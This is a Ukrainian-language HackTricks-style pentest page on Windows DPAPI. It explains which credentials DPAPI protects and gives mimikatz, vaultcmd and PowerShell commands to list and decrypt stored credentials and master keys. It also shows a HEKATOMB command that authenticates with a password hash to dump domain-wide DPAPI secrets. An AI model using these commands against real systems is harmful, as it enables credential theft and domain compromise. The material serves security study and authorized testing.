# DPAPI - Витягування Паролів

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) є найважливішою подією в сфері кібербезпеки в **Іспанії** та однією з найважливіших в **Європі**. З **метою просування технічних знань**, цей конгрес є гарячою точкою зустрічі для професіоналів у сфері технологій та кібербезпеки в усіх дисциплінах.

{% embed url="https://www.rootedcon.com/" %}

## Що таке DPAPI

API захисту даних (DPAPI) в основному використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи або секрети користувача, або системи як значне джерело ентропії. Цей підхід спрощує шифрування для розробників, дозволяючи їм шифрувати дані, використовуючи ключ, отриманий з секретів входу користувача або, для системного шифрування, секретів аутентифікації домену системи, таким чином усуваючи необхідність для розробників управляти захистом ключа шифрування самостійно.

### Захищені Дані за допомогою DPAPI

Серед особистих даних, захищених DPAPI, є:

- Паролі та дані автозаповнення Internet Explorer та Google Chrome
- Паролі електронної пошти та внутрішніх FTP-акаунтів для таких програм, як Outlook та Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж та Windows Vault, включаючи ключі шифрування
- Паролі для підключень до віддаленого робочого столу, .NET Passport та приватні ключі для різних цілей шифрування та аутентифікації
- Мережеві паролі, керовані Credential Manager, та особисті дані в програмах, що використовують CryptProtectData, таких як Skype, MSN messenger та інші

## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Файли облікових даних

Файли **облікових даних, що захищені** можуть бути розташовані в:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Отримайте інформацію про облікові дані за допомогою mimikatz `dpapi::cred`, у відповіді ви можете знайти цікаву інформацію, таку як зашифровані дані та guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Ви можете використовувати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` для розшифрування:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Ключі DPAPI, які використовуються для шифрування RSA ключів користувача, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де {SID} є [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **цього користувача**. **Ключ DPAPI зберігається в тому ж файлі, що й майстер-ключ, який захищає приватні ключі користувача**. Зазвичай це 64 байти випадкових даних. (Зверніть увагу, що цей каталог захищений, тому ви не можете перерахувати його за допомогою `dir` з cmd, але ви можете перерахувати його з PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Це те, як виглядає кілька Master Keys користувача:

![](<../../images/image (1121).png>)

Зазвичай **кожен master key є зашифрованим симетричним ключем, який може розшифрувати інший вміст**. Тому **екстракція** **зашифрованого Master Key** є цікавою для того, щоб **розшифрувати** пізніше той **інший вміст**, зашифрований з його допомогою.

### Екстракція master key та розшифровка

Перевірте пост [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) для прикладу того, як екстрактувати master key та розшифрувати його.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) є C# портом деяких функцій DPAPI з проекту [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) є інструментом, який автоматизує екстракцію всіх користувачів та комп'ютерів з LDAP каталогу та екстракцію резервного ключа контролера домену через RPC. Скрипт потім вирішить всі IP-адреси комп'ютерів і виконає smbclient на всіх комп'ютерах, щоб отримати всі DPAPI блоби всіх користувачів та розшифрувати все з резервним ключем домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

З екстрактованим списком комп'ютерів з LDAP ви можете знайти кожну підмережу, навіть якщо ви не знали про них!

"Тому що прав адміністратора домену недостатньо. Хакніть їх усіх."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично вивантажувати секрети, захищені DPAPI.

## Посилання

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) є найважливішою подією в галузі кібербезпеки в **Іспанії** та однією з найважливіших в **Європі**. З **метою просування технічних знань**, цей конгрес є гарячою точкою зустрічі для професіоналів у галузі технологій та кібербезпеки в кожній дисципліні.

{% embed url="https://www.rootedcon.com/" %}

{{#include ../../banners/hacktricks-training.md}}
